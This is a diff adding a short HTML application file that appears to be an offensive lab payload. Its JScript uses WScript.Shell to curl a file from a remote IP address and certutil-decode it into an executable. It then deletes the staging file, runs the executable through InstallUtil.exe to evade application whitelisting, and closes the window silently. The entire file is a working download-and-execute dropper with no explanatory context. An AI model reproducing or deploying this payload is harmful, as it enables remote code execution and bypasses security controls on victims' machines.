@@ -1,0 +1,14 @@
+<html> 
+<head> 
+<script language="JScript">
+
+        var shell = new ActiveXObject("WScript.Shell");
+        var amit = shell.Run("cmd.exe /c curl http://192.168.45.173/file.txt -o C:\\Users\\Public\\Documents\\file5.txt && certutil -decode C:\\Users\\Public\\Documents\\file5.txt C:\\Users\\Public\\Documents\\amit4.exe && del C:\\Users\\Public\\Documents\\file5.txt && C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U C:\\Users\\Public\\Documents\\amit4.exe");
+</script>
+</head> 
+<body>
+<script language="JScript">
+self.close();
+</script>
+</body> 
+</html>
